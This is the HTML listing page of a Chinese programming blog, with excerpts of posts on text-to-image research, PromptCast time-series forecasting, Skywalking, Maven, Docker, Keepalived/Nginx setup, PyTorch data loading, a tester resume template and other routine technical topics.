<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/82120563b43443454fc4518d76f4eba2/" rel="bookmark">
			（2021|CoRR，AugCLIP，优化）FuseDream：通过改进的 CLIP&#43;GAN 空间优化实现免训练文本到图像生成
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		FuseDream: Training-Free Text-to-Image Generation with Improved CLIP+GAN Space Optimization
公众：EDPJ（添加 VX：CV_EDPJ 或直接进 Q 交流群：922230617 获取资料）
目录
0. 摘要
1. 简介
2. CLIP+GAN 文本到图像生成
2.1 CLIP容易受到攻击并陷入困境
3. 我们的方法 - FuseDream
3.1 AugCLIP：避免对抗生成
3.2 优化改进
3.3 组合生成
4. 相关工作 5. 实验
6. 结论
S. 总结
S.1 主要贡献
S.2 方法
0. 摘要 生成图像从自然语言指令是一个引人入胜但极具挑战性的任务。我们采用了一种 CLIP+GAN 的方法来进行文本到图像的生成，该方法在现成的 GAN 的潜在空间中进行优化，以找到在 CLIP 模型度量下，与给定输入文本具有最大语义相关性分数的图像。与从头开始训练将文本映射到图像的传统方法相比，CLIP+GAN 方法是无需训练的、zero-shot 的，并且可以轻松定制以适应不同的生成器。
然而，在 GAN 空间中优化 CLIP 分数是一个极具挑战性的优化问题，像 Adam 这样的现成优化器未能产生令人满意的结果。在这项工作中，我们提出了一种 FuseDream 流水线，通过三种关键技术改进了 CLIP+GAN 方法： 1）通过在图像上引入随机增强来使标准的 CLIP 分数更加稳健的AugCLIP 分数。2）一种新颖的初始化和超参数化策略，允许我们有效地在 GAN 空间中的非凸区域进行优化。3）一种组合生成技术，通过利用一种新颖的双层优化公式，可以组合多个图像以扩展 GAN 空间并克服数据偏见。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/82120563b43443454fc4518d76f4eba2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1cdddf2a1dbb01c7801b51029cef5f38/" rel="bookmark">
			Skywalking 中 Agent 自动同步配置源码解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言正文实现架构实现模型OAP 同步 ApolloConfigWatcherRegisterConfigChangeWatcher Agent 侧 前言 本文代码 OAP 基于 v9.7，Java Agent 基于 v9.1，配置中心使用 apollo。
看本文需要配合代码“食用”。
正文 Skywalking 中就使用这种模型实现了 Agent 同步Apollo 配置，本文介绍下提供的功能以及代码实现，一起学习下。
Skywalking 支持 agent 动态更新配置，使 agent 可以依据业务需求进行自定义配置；更重要的是建立起这一个通信机制，那么 agent 的可管理性、扩展性都大大提升。
目前 Skywalking 提供了以下配置项
按照文档描述，主要为以下内容：
控制采样速率
忽略指定后缀的请求，注意必须是 first span 的 opretationName 匹配到
针对 web 服务，有些静态资源是放在服务端，那么可以过滤掉这些请求
忽略某些 path 的 trace
限定每个 segment 中的 span 最大数量
是否收集执行 sql 的参数
样例配置
configurations: serviceA: trace.sample_n_per_3_secs: 1000 trace.ignore_path: /a/b/c,/a1/b1/c1 serviceB: trace.sample_n_per_3_secs: 1000 trace.ignore_path: /a/b/c,/a1/b1/c1 注意：这个是按照服务来进行逐项配置，如果不需要变动，不要添加对应 key，会使用默认值。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1cdddf2a1dbb01c7801b51029cef5f38/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3dd615829d1598c20519764a2d4ca1c/" rel="bookmark">
			软件测试工程师简历项目经验怎么写?--9999个已成功入职的软件测试工程师真实简历
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简历是我们求职的第一步，也是非常重要的一步。
青云叔叔看过太多简历，最快3秒就淘汰一份简历，因为其实我们每天要收到很多简历进行筛选，那么面试官其实也是会很快进行对简历进行判断的，如果你对简历写的一塌糊涂，那么你瞬间就会被淘汰，那么一份好的简历应该怎么写呢？
一般分为如下几部分内容：
1、个人基本信息
对于这一部分来说，只要突出自己在个人基本信息的优势。
2、个人技能情况
技能的话就把你的过程改进思想和技术全部体现在里边，避免了解的词汇。
3、个人学校经历
具体的学校信息情况和时间。
4、个人工作经历
主要写哪年到哪年在哪家公司，简单描述做什么事情。
5、项目经验
这块最重要的，最好能有3个项目左右，如果你毕业1年以上的话，然后在这个项目写出完整的项目模块信息，对项目介绍，然后测试在项目的完整流程你做的事情，然后就是你做的特殊的更好保障项目的事情，比如过程改进，比如风险把控，比如技术落地，就不要只单纯写什么技术，而是综合技术和项目测试在项目测试发挥了什么作用，解决了什么问题，带来了什么收益。
6、自我评价
简单对自己进行描述，比如爱学习，爱运动，相信去拼就会赢，然后把自己之前的技术总结给个地址，比如博客、csdn、知乎、公众号等。
来来来，看看简历模板吧:
个人简历 个人信息：
姓 名：软件测试凡哥 性 别：男
学 历：本科 专 业：计算机科学与技术
联系方式： 邮 箱：
求职职位：
教育背景：
2012.9 - 2016.6 华北理工大学轻工学院
专业技能：
Ø 熟悉软件测试理论知识、软件测试流程，熟悉测试用例设计、用例执行,提交缺陷并进行 Bug 的跟踪和回归测试
Ø 熟练使用 TestLink、Jira、禅道等工具进行测试用例管理和缺陷管理
Ø 能独立编写测试设计、绘制思维导图、编写 Test Case、缺陷报告、测试报告等相关文档
Ø 熟悉等价类划分、边界值分析、场景法、判定表、因果图、错误推断法、正交实验测试
Ø 熟悉探索式测试思想、判断哪些项目适合做探索式测试和如何在项目中具体落地
Ø 熟悉敏捷思想、迭代式开发、结合 jira 将敏捷落地以及整理需求清单，拆分 sprint，生
成看板。
Ø 熟练linux下常用命令，能够进行测试环境搭建，熟悉日志分析；
Ø 能够独立组建测试团队，擅长测试团队组建、团队管理、团队梯队建设，对质量管理有自己的见解；
Ø 熟悉常见的iOS应用调试工具（Xcode，Xcode commandline Tools）
Ø 熟悉JAVA，python等常用编程语言，编写压力测试工具，熟悉基本的数据库知识；
Ø 具有android开发经验，android的开发及可以log的分析；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e3dd615829d1598c20519764a2d4ca1c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d8c93acdfb1ddf6ccb6a59e7c5ae793/" rel="bookmark">
			计算机视觉基础（11）——语义分割和实例分割
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 在这节课，我们将学习语义分割和实例分割。在语义分割中，我们需要重点掌握语义分割的概念、常用数据集、评价指标（IoU）以及经典的语义分割方法（Deeplab系列）；在实例分割中，需要知道实力分割可以近似看为“目标检测+语义分割”，需要知道Mask R-CNN方法的计算流程，以及评价指标mAP。
一、语义分割 1.1 分割类任务的定义 分割类任务是一种密集标注任务，即将图像中每个像素赋予一个语义或者实例标签。
1.2 语义分割的应用场景 无人驾驶机器人医学图像…… 1.3 常用数据集 1.3.1 Pascal VOC Dataset VOC数据集是计算机视觉主流数据集之一，由牛津大学、比利时鲁汶大学等高校的视觉研究组联合发布，可以用作分类，分割，目标检测，动作检测和人物定位五类任务，包含21个类别标签，训练1464，验证1449，测试1456。 1.3.2 MS COCO Dataset MS COCO（Microsoft Common Objects in Context Dataset）是微软发布的一个大规模物体检测，分割及文字定位数据集，支持目标检测、实例分割、全景分割、Stuff Segmentation、关键点检测、看图说话等任务类型，包含80个对象类别。 1.3.3 ADE20K Dataset ADE20K数据集由 MIT CSAIL 研究组发布，涵盖广泛的场景和对象类别，可用于场景感知、解析、分割、多物体识别和语义理解。该数据集构建了一个场景解析基准，包含150个对象和素材类。
1.3.4 CityScapes Dataset CityScapes是由奔驰自动驾驶实验室、马克思·普朗克研究所、达姆施塔特工业大学联合发布的图像数据集，专注于对城市街景的语义理解。 该数据集包含50个城市不同场景、不同背景、不同街景，以及30类涵盖地面、建筑、交通标志、自然、天空、人和车辆等的物体标注，共有5000张精细标注的图像和2万张粗略标注的图像。 1.4 评价指标（重点） 平均交并比 (mean Intersection over Union, mIoU) ——每个类别的所有像素去计算交并比
1.5 语义分割方法 1.5.1 基于滑动窗的提取图像块后分类 基于滑动窗提取图像块然后对图像块的中心进行分类
1.5.2 用CNN计算整幅图的特征 用CNN计算整幅图的特征，然后在其上进行标签预测
1.5.3 全卷积网络 【方案一】
设计只含有卷积层而没有降采样操作的神经网络，这样可以同时对所有像素进行标签预测
【方案二】
设计包含卷积层、下采样操作和上采样操作的神经网络。
下采样操作：可以通过池化和加大卷积步长来实现 上采样操作：可以通过插值、逆池化和转置卷积来实现
【插值】
【逆池化】
【转置卷积】
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0d8c93acdfb1ddf6ccb6a59e7c5ae793/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d00c0f575ce1230885569a5fd884e2b7/" rel="bookmark">
			Maven高级篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Maven依赖管理原则;
可选依赖：隐藏当前项目中的指定的包，如此，别的包引用当前包时，当前包中的指定包就被隐藏了，在别的包中无法看到隐藏的包
排除依赖：指定排除引用包中所包含的依赖，防止与当前项目中的jar包冲突
依赖范围注意点：
依赖传递时的依赖范围的界定：
Maven的生命周期：
clean:清理—&gt;&gt;default：核心的工作，如编译，测试，打包，部署等等…—&gt;&gt;site：产生报告，发布站点等
clean生命周期；
default构建生命周期：
这个周期，在设置指定的位置后，程序会从头一直到这个指定的位置结束，参考下图为周期线
site构建生命周期：
maven插件：用于在（一般）default中，或者maven执行的生命周期中的一个指定的位置开始执行插件，可以打包主函数的jar包，可以打包测试函数的jar包等等
如：&lt;phase&gt;是指定生命周期的位置， &lt;goal&gt;是打包啥（测试包，主程序包等等）
&lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;jar&lt;/goal&gt; &lt;goal&gt;test-jar&lt;/goal&gt; &lt;/goals&gt; &lt;phase&gt;generate-test-resources&lt;/phase&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; A模块引用B模块时，需要先将B模块在maven中进行install，然后再启动A模块
当前模块引用一些bean时，因为当前模块没有，在其它模块，所以会爆红，但是不是错误
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48852b3a594c9ff502833455c21401c6/" rel="bookmark">
			二重积分处理一重积分面积、体积法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33a5bd642e67ce1ab190ccad7a24f5f1/" rel="bookmark">
			freeRTOS实时操作系统学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 温馨提示：点击图片查看大图更清晰
—————————————————————————————↑↑↑上方资源下载后可获取xmind原文件。 1、freeRTOS移植和配置脑图 2、内核源码学习 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32392a8ff9099a620ca0da82359c031e/" rel="bookmark">
			第十三节TypeScript 元组
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、简介
我们知道数组中元素的数据类型一般都是相同的（any[]类型的数组可以不同），如果存储的元素类型不同，则需要使用元组。
元组中允许存储不同类型的元素，元组可以作为参数传递给函数。2、创建元组的语法格式：
var tuple_name = [value1,value2,value3,…value n] 实例：
声明一个元组并初始化 var mytuple = [2,"Android"]; 或者我们先声明一个元组，在初始化： var mytuple = []; mytuple[0] = 110; mytuple[1] = 220; 3、访问元组
元组中元素是使用索引来访问的，并且索引是从0开始的，即第一个元素的索引是0，一直到最后一个n-1。
访问语法格式：
tuple_name[index] 实例：
var mytuple = [10, "Android"]; // 创建元组 console.log(mytuple[0]); console.log(mytuple[1]); 执行结果：
10
Android
4、元组运算
我们可以对元组元素进行新增或删除操作：
push() – 向元组添加元素，添加是从后面添加的。pop() – 从元组中删除元素，并且删除是最后一个且返回移除的元素。 var mytuple = [10, "Hello", "World", "typeScript"]; console.log("添加前元素个数：" + mytuple.length); // 返回元组的大小 mytuple.push(12); // 添加到元组中 console.log("添加后元素个数：" + mytuple.length); console.log("删除前元素个数：" + mytuple.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/32392a8ff9099a620ca0da82359c031e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0513faeac2790f371892df5d28f923c6/" rel="bookmark">
			基于flask和echarts的新冠疫情实时监控系统源码&#43;数据库，后端基于python的flask框架，前端主要是echarts
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍 基于flask和echarts的新冠疫情实时监控系统
软件架构 后端基于python的flask框架，前端主要是echarts
安装教程 下载到本地，在python相应环境下运行app.py,flask项目部署请自行完成
使用说明 flaskProject文件夹中
app.py是flask项目主运行文件
sql_query.py是为flask项目封装的数据库操作文件，
请在sql_query.py中的get_conn()中修改数据库配置spider是项目所需的爬虫模块 里面的main.py是爬虫主运行文件ex_sql.py是封装的存储爬取的数据的数据库操作文件，
同样在get_conn()中修改数据库配置 前端js文件
china.js,echarts.min.js,jquery.jsflexible.js(是淘宝开发的一个用来适配移动端的js框架,这个是我手写的简易版源码)index.js(里面是项目定制的echarts以及一些ajax) 数据库用的三张表在covproject.sql中
项目展示 注 如有部分数据源有问题，是爬取的数据源数据部分有误，只需重构爬虫换api，将数据填充到数据库对应的表中即可！如果爬虫失效，文件中sql文件里有模拟数据，可以将项目运行起来。（主要是details表的现有确珍数据有误（数据源有误），因为这张表具体到市，重构时可直接获取省份数据，因为项目并没有用到具体到市的数据，只是为了考虑扩展而这样爬取的）
完整代码下载地址：基于flask和echarts的新冠疫情实时监控系统
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93d914eafa38a3011607b1c2afcdc7f4/" rel="bookmark">
			Linux Tools Quick Tutorial 学习记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 总体 书籍链接 find命令 查找大于多少的文件 find / -type f -size +5M | xargs ls -lh | awk '{print $5, $9}' | ls -lrt 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c3473b9e7216393cc7a851e8a2e1587/" rel="bookmark">
			【时间序列】PromptCast：基于提示学习的时序预测模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章地址：https://arxiv.org/pdf/2210.08964.pdf
代码地址：https://github.com/HaoUNSW/PISA
1.概要 目前时序预测的SOTA模型大多基于Transformer架构，以数值序列为输入，如下图的上半部分所示，通过多重编码融合历史数据信息，预测未来一定窗口内的序列数值。受到大语言模型提示工程技术的启发，文章提出了一种时序预测新范式，即通过一定的提示词模版将数值输入转化为语句，利用大语言模型进行预测，把时序预测转变成了一个对话任务，如下图的下半部分所示。同时，文章公开了数据集（PISA）用于评估所提出算法的性能。
2.数据集介绍 PISA数据集包含三个实际场景的数据，分别是：天气预报数据、电力负荷预测数据和人类活动预测数据。
天气预报数据集来自网站：https://academic.udayton.edu/kissock/http/Weather/default.htm，PISA从中随机选择了110个城市的每日平均温度（以华氏度为单位）。
电力负荷数据（ECL）来自网站：https://archive.ics.uci.edu/ml/datasets/ElectricityLoadDiagrams20112014，原始数据包含321个用户每小时的电力消耗数据（以千瓦时为单位），作者剔除了那些记录不完整的用户数据，并从中随机选择了50个记录完整的用户数据。
SafeGraph人类活动数据（SG）来自SafeGraph Weekly Patterns3记录的每日访问POI的访客数，随机选择了324个记录完整的POI15个月的访客数。
作者依次将上述数据集按照7:1:2的比例，沿时间轴划分成了训练、验证和测试数据集，同时采用滑窗的方式构建样本（基于15个历史样本预测下一个时刻的值）。为了区分数值数据和为语言模型处理的基于语言的数据集，通过上述滑动窗口处理的数值序列称作PISA-numerical，整个数据集包含三十万左右的样本点。作者对所有的数据都进行了脱敏处理，避免信息泄漏。
此时构建的PISA-numerical并不能直接送入语言模型中进行预测，文章进一步利用templeta实现data-to-text的转变，具体使用的模版如下，这里就不过多阐述。可以看到通过如下的转变，预测样本转变了一问一答的形式，符合语言模型输入输出的形式。
3.模型与实验 文章的实验设计围绕如下两个问题展开：
RQ1: 能否使用语言模型在PromptCast任务设置下预测时间序列？与传统基于数值的时间序列预测方法相比，基于语言模型的性能如何？
RQ2: 使用提示以及语言生成模型进行时间序列预测能否实现更好的泛化能力？
除了使用RMSE和MAE作为评价指标，文章考虑到语言模型的推理过程存在不确定性，无法保证每个测试实例都能能解码出数值引入了缺失率作为一项评估指标，定义为，其中和分别是测试集中的实例总数和能成功解码预测值的实例数,缺失率越小对应更好的性能。
在语言模型部分，文章选取了10个语言模型进行对比验证，包括T5、Bart、BERT、RoBERTa、Electra、Bigbird、ProphetNet、LED、Blenderbot和Pegasus。传统数值预测方法部分，文章选取了3种简单的预测方法：复制昨天（CY）、历史平均（HA）和复制上周（CLW）。基于深度学习的数值预测模型：文章选取了AutoARIMA，LSTM，TCN，vanilia Transformer，Informer、Autoformer，FEDformer。
数值模型和语言模型的结果如下：
其中只有基于transformer的模型可以采用不同的方式构造temporal embedding（position embedding），这里文章对比了三种不同temporal embedding的效果，其中fixed embedding展现出最好的效果。
对于所有的语言模型，均使用的是由HuggingFace提供的现成的预训练权重进行初始化。其中，这些预训练权重是用通用英语语料库数据集，如BookCorpus、CC-News和OpenWebText等训练的，这些数据集通常收集的是一般文章，并不包括时间序列的数据，PISA虽是公开数据集，但仅可在线获取csv格式数据，这保证了语言模型预训练过程中没有使用PISA数据集，避免了文本泄漏。在实验中，每个语言模型均使用了PISA中对对应的训练集进行微调。对比不同的语言模型，Bigbird展现出最佳性能。对比数值模型和语言模型，语言模型在CT和ECL子集均展现出更好的性能，在SG上也达到了与数值模型差不多的结果。除了BERT、Electra、Bigbird、ProphetNet，其他语言模型的缺失率均为0，成功解码出包含数值的回复。这部分实验回复了作者提出的第一个问题，即通过promptcast的方式，语言模型是能够进行时间序列预测任务，并且能够达到跟数值预测模型不相上下的结果。
接着作者进一步测试了在零样本（用两个数据集训练或微调，用另一个数据集做测试）和从头开始用PISA数据集训练语言模型两种不同设定下，数值模型和语言模型的对比效果。
大部分数值模型在零样本设定下表现出较差的性能，相反不论是从头开始训练还是零样本微调，三个语言模型都表现出不错的效果，具有更好的泛化性能。
4.总结 文章将时序数据转变成文本数据，将时序预测任务转变成对话预测任务，利用语言模型实现了时序数据预测，也通过不同实验验证了语言模型在时序预测任务的有效性和泛化性。同时，文章构建了首个基于提示词的时序预测任务数据集。为什么语言模型能够进行时序预测，作者认为通过提示词，语言模型可以很好地使用辅助信息，如一天中的时间和场景语义信息，同时更好地理解这些辅助信息与时序数据间的关系，有助于提升预测性能。同时，作者也希望本文的探索能够为其他研究者提供有关后续研究的启发，例如如何生成适合数值数据的文本提示，固定的模板可能导致偏见。为此，是否可以通过语言模型自动生成对时序数据的描述。
推荐阅读：
我的2022届互联网校招分享
我的2021总结
浅谈算法岗和开发岗的区别
互联网校招研发薪资汇总
公众号：AI蜗牛车
保持谦逊、保持自律、保持进步
发送【蜗牛】获取一份《手把手AI项目》（AI蜗牛车著）
发送【1222】获取一份不错的leetcode刷题笔记
发送【AI四大名著】获取四本经典AI电子书
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98b66c0c0feb0e95a99fabfa7999c90a/" rel="bookmark">
			Centos7中KeepAlived&amp;Nginx高可用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Centos7中KeepAlived&amp;Nginx高可用 一.部署前规划 角色操作系统IPmasterCentos7.8192.168.56.101backupCentos7.8192.168.56.102 二.keepalived安装 在两台机器上执行安装
yum install -y keepalived 三.master角色配置（192.168.56.101） /etc/keepalived/keepalived.conf
注意这里：interface enp0s3是对应的网卡名称，如果你的网卡名称不一样，就修改下。
cat &gt; /etc/keepalived/keepalived.conf &lt;&lt;EOF global_defs { router_id LVS_DEVEL } vrrp_script chk_nginx { script "/etc/keepalived/scripts/nginx_check.sh" interval 2 weight -20 } vrrp_instance VI_1 { state MASTER interface enp0s3 virtual_router_id 51 priority 100 advert_int 1 authentication { auth_type PASS auth_pass 1111 } track_script { chk_nginx } virtual_ipaddress { 192.168.56.140 } } EOF 编写nginx进程检查的脚本
/etc/keepalived/scripts/nginx_check.sh
## mkdir /etc/keepalived/scripts/ ## cat &gt; /etc/keepalived/scripts/nginx_check.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98b66c0c0feb0e95a99fabfa7999c90a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba26a38366e37e879c59e8038f56c212/" rel="bookmark">
			刘二大人《PyTorch深度学习实践》p8加载数据集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		刘二大人《PyTorch深度学习实践》p8加载数据集 一、零碎知识点1.enumerate() 二、Batch（批次）和Mini-Batch1.Mini-Batch2.Dataset（数据集）3.DataLoader（数据加载器） 三、课程代码 一、零碎知识点 1.enumerate() enumerate()是python的一个内置函数，用于对可迭代对象进行遍历，并返回索引和对应的元素。
citys = ["wuhan", "chengdu", "shanghai", "beijing"] for index,city in enumerate(citys): print(index,city) # output： 0 wuhan 1 chengdu 2 shanghai 3 beijing 在深度学习中，enumerate(train_loader, 0)将训练数据加载器train_loader作为第一个参数传递给enumerate()函数，同时将起始索引设置为0。这样，遍历训练数据加载器时，会返回每个小批次的索引和对应的训练样本，获取当前是第几次迭代。
二、Batch（批次）和Mini-Batch 假设我们有一个训练集包含10000个图像样本，用于进行手写数字识别任务。
如果我们选择不使用Mini-batch，直接将整个训练集作为一个批次进行训练，那么每次迭代更新参数时，我们需要计算10000个样本的损失和梯度，然后更新参数，计算和更新参数的代价非常高。
在选择使用Mini-batch时，设置batch-size=1000，在每个迭代中，我们只计算并更新一个Mini-batch的损失和梯度。那么只需要迭代10次便可完成计算。
1.Mini-Batch Epoch（训练周期）
Epoch是训练神经网络时的一个概念，表示将所有训练样本都通过神经网络进行前馈传播和反向传播的一次迭代。Batch-Size（批次大小）
Batch-Size是指在训练过程中每个迭代步骤中用于更新模型参数的样本数量。Iteration（迭代）
Iteration表示完成一次batch训练所需更新权重和偏置参数的迭代次数。 2.Dataset（数据集） Dataset是一个抽象类，用于表示数据集的抽象接口。它定义了一些必须实现的方法，例如__len__（返回数据集的大小）和__getitem__（通过索引获取样本）等。通过创建一个数据集对象，我们可以访问和处理数据集中的样本。
我的通俗理解是：dataset是一个支持索引index[i]和长度len的数据集
import torch from torch.utils.data import Dataset from torch.utils.data import DataLoader 3.DataLoader（数据加载器） # 创建数据加载器 train_loader = DataLoader(dataset=dataset, batch_size=2, shuffle=True, num_workers=2) dataset=datasetbatch_size=2（一个批次里面含有两个样本）shuffle=True
为了提高训练的随机性，对数据集进行打乱。num_workers=2
将来读数据集的时候，需要几个并行进程来去读取数据。 三、课程代码 准备数据集构造模型构造损失函数和优化器训练周期循环 import numpy as np import torch from matplotlib import pyplot as plt from torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ba26a38366e37e879c59e8038f56c212/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/329bac0e8e7386bf86550a9ba09aa002/" rel="bookmark">
			Httprunner4.3.6产生大量python进程的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		hrp run执行测试用例目录的时候，发现产生了大量的python进程，导致内存爆了
具体原因是因为每执行一个测试用例，就会注册一次plugin(产生一个python进程），引用测试用例也是一样，会产生一个python进程，具体可以看源码，如下：判断plugin是否注册过，是用key：debugtalk.py 这个文件路径，plugin注册后，存到pluginMap，是用
.debugtalk_gen.py这个文件路径作为key，导致每次注册前判断是否注册过，都会被判定为没有注册过。
具体修改方法：https://github.com/httprunner/httprunner/pull/1720
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bc4f8335401b7e8257d932d2dd86fe0/" rel="bookmark">
			Docker介绍、常用命令与操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Docker介绍、常用命令与操作 学习前言为什么要学习DockerDocker里的必要基础概念常用命令与操作1、基础操作a、查看docker相关信息b、启动或者关闭docker 2、容器操作a、启动一个镜像i、后台运行ii、前台运行 b、容器运行情况查看c、日志查看d、容器删除 3、镜像操作a、镜像拉取b、查看已有镜像c、镜像删除d、将正在运行的容器保存为镜像e、编译自己的镜像i、Dockerfile.ds编写原则ii、Dockerfile.ds组成iii、Dockerfile.ds示例与编译镜像示例 学习前言 工作了一段时间，感觉Docker真的是一个很方便的工具，无论复现代码还是部署服务器，不用特别担心环境的错误。
为什么要学习Docker 从这么长时间使用Docker的情况来看，我认为学习Docker的主要原因便是它的方便。生产过程中有各种环境，如果每到一个服务器都进行环境的部署的话，不仅调试麻烦，实际上线的时候也会因为各种环境问题导致服务崩溃。
当前市面上复刻环境的方法一般有两种：
1、虚拟机技术，可以在操作系统中模拟硬件设备，然后运行另一个操作系统，比如在 Windows 系统里面运行Linux系统，这样就可以运行任意的Linux应用。因此，我们保留了某个环境的镜像，就可以复刻环境了；
2、容器技术，与虚拟机通过操作系统实现隔离不同，容器技术只隔离应用程序的运行时环境，但容器之间可以共享同一个操作系统。因此，假设我们都在Linux环境上，使用容器技术，无需模拟硬件设备，直接就使用另一个Linux环境的镜像即可；
相比于虚拟机技术，容器技术无需模拟硬件设备，底层操作系统是共享的，因此容器技术更加轻量级。
Docker基于容器技术，只需保留镜像，就可以在另外一个Linux操作系统中运行。
而Docker的使用方式也很简单，一般在Linux环境下使用，拉取一个镜像，然后运行起来即可，而后的操作就和在正常的系统中操作一样。
Docker里的必要基础概念 Docker里的必要基础概念是镜像和容器：
镜像（Image）：利用Docker将运行的程序及其依赖库、函数库、配置等文件打包在一起，简单理解就是打包后的程序环境，开箱即用。称为镜像。
容器（Container）：镜像运行后形成的进程就是容器，一个系统可以运行多个容器，Docker会给容器进程做隔离，不同进程之间不可见。
常用命令与操作 1、基础操作 a、查看docker相关信息 查看docker版本信息。
docker version 显示docker系统的信息
docker info b、启动或者关闭docker 启动docker
sudo service docker start 关闭docker
sudo service docker stop 2、容器操作 a、启动一个镜像 开始运行docker镜像一般使用docker run。
该命令有很多的参数，这里我们介绍一下最常用的部分参数
-i，以交互模式运行容器，通常与 -t 同时使用 -t，启动容器后，为容器分配一个命令行，通常与-i同时使用 -v，目录映射，容器目录挂载到宿主机目录，格式： &lt;host目录&gt;:&lt;容器目录&gt; -d，守护进程，后台运行该容器 -p，指定端口映射，格式：主机(宿主)端口:容器端口 --name "nginx-lb"，容器名字 -e --env username="ritchie"，设置环境变量 在这里我给几个例子，看情况进行复制使用即可：
i、后台运行 以后台模式运行一个容器，容器名字为test1，主机的8099端口对应容器环境的80端口，主机的444端口对应容器环境的443端口，默认包含两个环境变量TEST_ENV和TEST_ENV2，分别是1234和12345。
docker run -d --name=test1 8099:80 -p 444:443 -e TEST_ENV=1234 -e TEST_ENV2=12345 这样运行后，会返回一个容器id，此时我们可以通过下述指令进入容器。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3bc4f8335401b7e8257d932d2dd86fe0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f50ddec5378d64fff9fac5228ae56d9/" rel="bookmark">
			跳跃游戏-含升级版
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DESC1: 给定一个非负整数数组 nums ，你最初位于数组的 第一个下标 。
数组中的每个元素代表你在该位置可以跳跃的最大长度。
判断你是否能够到达最后一个下标。
示例 1：
